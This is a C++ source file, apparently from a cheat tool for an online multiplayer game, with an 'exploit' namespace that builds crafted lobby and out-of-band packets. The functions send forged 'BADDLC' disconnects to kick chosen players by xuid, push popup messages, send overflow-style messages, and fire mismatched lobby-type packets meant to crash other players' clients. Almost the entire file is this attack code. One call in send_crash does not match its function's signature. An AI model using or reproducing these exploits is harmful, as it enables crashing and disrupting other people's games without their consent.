#include "dependencies/std_include.hpp"
#include "exploit.hpp"

namespace exploit
{
	namespace instant_message
	{
		void send_popup(const std::uint64_t target_id)
		{
			if (game::Live_IsDemonwareFetchingDone(0))
			{
				constexpr auto message{ 0 };
				game::send_instant_message({ target_id }, 'f', &message, sizeof message);
			}
		}

		void send_info_response_overflow(const std::uint64_t target_id)
		{
			if (game::Live_IsDemonwareFetchingDone(0))
			{
				char buf[0x400] = { 0 };
				game::msg_t msg{};

				game::LobbyMsgRW_PrepWriteMsg(&msg, buf, sizeof buf, game::MESSAGE_TYPE_INFO_RESPONSE, 0);

				constexpr auto nonce{ 0u };
				game::LobbyMsgRW_PackageUInt(&msg, "nonce", &nonce);
				constexpr auto ui_screen{ 0 };
				game::LobbyMsgRW_PackageInt(&msg, "uiscreen", &ui_screen);
				constexpr auto nat_type{ 0ui8 };
				game::LobbyMsgRW_PackageUChar(&msg, "nattype", &nat_type);

				game::LobbyMsgRW_PackageArrayStart(&msg, "lobbies");
				game::MSG_WriteByte(&msg, 12);
				
				//game::send_instant_message({ target_id }, 'h', msg.data, msg.cursize);
			}
		}
	}

	namespace lobby_msg
	{
		void send_disconnect_client(const std::uint64_t to)
		{
			game::Msg_ClientReliableData data{};
			data.dataMask = 4;
			data.lobbyType = game::session->type;
			data.disconnectClient = game::LOBBY_DISCONNECT_CLIENT_BADDLC;
			data.disconnectClientXuid = to;

			game::SendClientReliableData(0, data.lobbyType, &data);
		}

		void send_disconnect_client(const game::netadr_t& to, const std::uint64_t target_id)
		{
			char buf[0x20000] = { 0 };
			game::msg_t msg{};

			game::LobbyMsgRW_PrepWriteMsg(&msg, buf, sizeof buf, game::MESSAGE_TYPE_LOBBY_CLIENT_RELIABLE_DATA, 0);
			
			constexpr auto data_mask{ 4u };
			game::LobbyMsgRW_PackageUInt(&msg, "datamask", &data_mask);
			const int lobby_type{ game::session->type };
			game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &lobby_type);
			game::LobbyMsgRW_PackageXuid(&msg, "discclientxuid", &target_id);
			constexpr int disconnect_type{ game::LOBBY_DISCONNECT_CLIENT_BADDLC };
			game::LobbyMsgRW_PackageInt(&msg, "discclient", &disconnect_type);

			game::oob::send_lobby_msg(to, &msg, game::LOBBY_MODULE_HOST);
		}

		void send_peer_to_peer_info(const game::netadr_t& to, const game::Msg_PeerToPeerInfo& message)
		{
			char buf[0x20000] = { 0 };
			game::msg_t msg{};

			game::LobbyMsgRW_PrepWriteMsg(&msg, buf, sizeof buf, game::MESSAGE_TYPE_PEER_TO_PEER_INFO, 0);
			game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &message.lobbyType);
			game::LobbyMsgRW_PackageInt(&msg, "connectbit", &message.connectivityBits);
			game::LobbyMsgRW_PackageXuid(&msg, "xuid", &message.clientXuid);

			game::oob::send_lobby_msg(to, &msg, game::LOBBY_MODULE_HOST);
		}

		void send_lobby_host_heartbeat(const game::netadr_t& to, const game::Msg_LobbyHostHeartbeat& message)
		{
			char buf[0x20000] = { 0 };
			game::msg_t msg{};

			game::LobbyMsgRW_PrepWriteMsg(&msg, buf, sizeof buf, game::MESSAGE_TYPE_LOBBY_HOST_HEARTBEAT, 0);
			game::LobbyMsgRW_PackageInt(&msg, "heartbeatnum", &message.heartbeatNum);
			game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &message.lobbyType);
			game::LobbyMsgRW_PackageInt(&msg, "lasthosttimems", &message.migrateInfo.lasthostTimeMS);

			game::oob::send_lobby_msg(to, &msg, game::LOBBY_MODULE_CLIENT);
		}

		void send_lobby_migrate_start(const game::netadr_t& to, const game::Msg_LobbyMigrateStart& message)
		{
			char buf[0x20000] = { 0 };
			game::msg_t msg{};

			game::LobbyMsgRW_PrepWriteMsg(&msg, buf, sizeof buf, game::MESSAGE_TYPE_LOBBY_MIGRATE_START, 0);
			game::LobbyMsgRW_PackageInt(&msg, "lobbytype", &message.lobbyType);
			game::LobbyMsgRW_PackageXuid(&msg, "migrateTo", &message.migrateTo);

			game::oob::send_lobby_msg(to, &msg, game::LOBBY_MODULE_PEER_TO_PEER);
		}

		void send_join_party_overflow(const game::netadr_t& to)
		{
			char buf[0x20000] = { 0 };
			game::msg_t msg{};

			game::LobbyMsgRW_PrepWriteMsg(&msg, buf, sizeof buf, game::MESSAGE_TYPE_JOIN_LOBBY, 0);

			game::oob::send_lobby_msg(to, &msg, game::LOBBY_MODULE_PEER_TO_PEER);
		}

		void send_lobby_type_crash(const game::netadr_t& to, const game::LobbyType type)
		{
			send_peer_to_peer_info(to, { type });
			send_lobby_migrate_start(to, { type });
			//send_lobby_host_heartbeat(to, { 1, type });
		}
	}

	void send_connect_response_migration_packet(const game::netadr_t& to)
	{
		PRINT_LOG("Sending connectResponseMigration packet to %s", utils::string::adr_to_string(&to).data());
		game::oob::send(to, "connectResponseMigration");
	}
	
	void send_mstart_packet(const game::netadr_t& to)
	{
		PRINT_LOG("Sending mstart packet to %s", utils::string::adr_to_string(&to).data());
		game::oob::send(to, "mstart");
	}

	void send_crash(const game::netadr_t& to)
	{
		PRINT_LOG("Sending crash packets to %s", utils::string::adr_to_string(&to).data());

		//lobby_msg::send_join_party_overflow(to);
		lobby_msg::send_lobby_type_crash(to);
		//lobby_msg::send_lobby_host_heartbeat(to);
	}
}